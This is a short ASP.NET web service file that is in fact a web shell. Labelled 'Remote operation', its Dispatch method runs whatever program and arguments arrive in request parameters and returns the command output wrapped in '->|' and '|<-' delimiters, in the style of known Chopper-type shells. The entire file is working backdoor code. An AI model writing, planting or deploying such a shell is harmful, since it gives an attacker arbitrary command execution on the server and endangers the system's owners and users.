<%@ WebService Language="C#" Class="RemoteControl" %>
[WebMethod(Description="Remote operation")]
public string Dispatch(String z, String z1, String z2, String z3) {
 String Z1 = z1;
 ProcessStartInfo c = new ProcessStartInfo(Z1.Substring(2));
 Process e = new Process();
 c.RedirectStandardOutput = true;
 c.RedirectStandardError = true;
 e.StartInfo = c;
 c.Arguments = z2;
 e.Start();
 string R = e.StandardOutput.ReadToEnd();
 return "\x2D\x3E\x7C" + R + "\x7C\x3C\x2D";
}
